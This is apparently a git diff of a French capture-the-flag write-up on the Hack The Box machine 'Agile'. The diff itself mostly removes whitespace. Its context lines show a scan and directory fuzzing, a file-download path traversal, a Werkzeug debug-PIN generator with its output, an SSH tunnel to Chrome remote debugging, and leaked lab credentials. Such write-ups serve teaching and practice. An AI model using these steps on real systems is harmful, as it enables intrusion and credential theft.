@@ -22,7 +22,7 @@ Host is up (0.020s latency).
 Not shown: 65533 closed tcp ports (conn-refused)
 PORT   STATE SERVICE VERSION
 22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0)
-| ssh-hostkey: 
+| ssh-hostkey:
 |   256 f4bcee21d71f1aa26572212d5ba6f700 (ECDSA)
 |_  256 65c1480d88cbb975a02ca5e6377e5106 (ED25519)
 80/tcp open  http    nginx 1.18.0 (Ubuntu)
@@ -40,14 +40,14 @@ Avec ffuf on a ce résultat pour les sous dossiers :
 
 ```bash
 ──(kali㉿kali)-[~]
-└─$ ffuf -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt:FUZZ -u http://superpass.htb/FUZZ -fs 6128 
+└─$ ffuf -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt:FUZZ -u http://superpass.htb/FUZZ -fs 6128
 
-        /'___\  /'___\           /'___\       
-       /\ \__/ /\ \__/  __  __  /\ \__/       
-       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
-        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
-         \ \_\   \ \_\  \ \____/  \ \_\       
-          \/_/    \/_/   \/___/    \/_/       
+        /'___\  /'___\           /'___\
+       /\ \__/ /\ \__/  __  __  /\ \__/
+       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
+        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
+         \ \_\   \ \_\  \ \____/  \ \_\
+          \/_/    \/_/   \/___/    \/_/
 
        v2.0.0-dev
 ________________________________________________
@@ -89,7 +89,7 @@ Si on tape juste le point d'accès download, on a une erreur (qui permet de conf
 
 ![Capture d’écran du 2023-06-29 11-58-20.png](1.png)
 
-On voit directement le code. 
+On voit directement le code.
 
 Il est très simple, il prend en paramètre un argument 'fn' et cherche le fichier correspondant s'il existe.
 
@@ -135,7 +135,7 @@ def generate_pin(public_bits, private_bits):
 		hash.update(bit)
 	hash.update(b"cookiesalt")
 	cookie_name = f"__wzd{hash.hexdigest()[:20]}"
-	
+
 	if num is None:
 		hash.update(b"pinsalt")
 	num = f"{int(hash.hexdigest(), 16):09d}"[:9]
@@ -206,7 +206,7 @@ DEVICEMACADDRESS="00:50:56:96:2f:9d" # Sample. Leak /proc/net/arp then, leak /sy
 Ce qui nous donne comme résultats :
 
 ```bash
-kibatche@kibatche-System-Product-Name:/media/kibatche/Achille/shared_folder_vm/HTB/Boxes/Agile$ ./werkzeug_generate_pin.py 
+kibatche@kibatche-System-Product-Name:/media/kibatche/Achille/shared_folder_vm/HTB/Boxes/Agile$ ./werkzeug_generate_pin.py
 ['345050066845', b'ed5b159560f54721827644bc9b220d00superpass.service']
 Public Bits : f['www-data', 'flask.app', 'Flask', '/app/venv/lib/python3.10/site-packages/flask/app.py']
 Pin code : 940-671-208 | cookie name : __wzd5b18af0a915bb04d69e0
@@ -269,15 +269,15 @@ ssh -L 41829:127.0.0.1:41829 corum@superpass.htb
 
 Ensuite on peut accéder au site via google chrome et le mode de débug à distance.
 
-https://exploit-notes.hdks.org/exploit/linux/privilege-escalation/chrome-remote-debugger-pentesting/
+Payload [ici](https://exploit-notes.hdks.org/exploit/linux/privilege-escalation/chrome-remote-debugger-pentesting/).
 
 On peut accéder au site test et tomber sur une nouvelle paire utilisateur/mot de passe :
 
 ```html
-    <td>agile</td>
-    <td>edwards</td>
-    <td>d07867c6267dcb5df0af</td>
-    ```
+<td>agile</td>
+<td>edwards</td>
+<td>d07867c6267dcb5df0af</td>
+```
 
 Cela ne nous mène pas à root, mais peut-être que ce user nous mènera à root.
 
